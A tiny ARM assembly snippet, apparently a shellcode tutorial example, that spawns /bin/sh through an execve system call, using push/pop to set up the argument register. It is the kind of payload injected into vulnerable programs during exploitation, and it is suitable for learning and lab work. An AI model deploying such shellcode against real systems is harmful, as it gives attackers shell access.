.section .text
.globl _start
_start:
	# example of popping a shell with
	# push/pop instruction involved.
	ldr  r4, =shell
	push {r4}
	pop  {r0}
	eor r1, r1, r1
	eor r2, r2, r2
	mov r7, #11
	svc #0

shell:
	.asciz "/bin/sh"
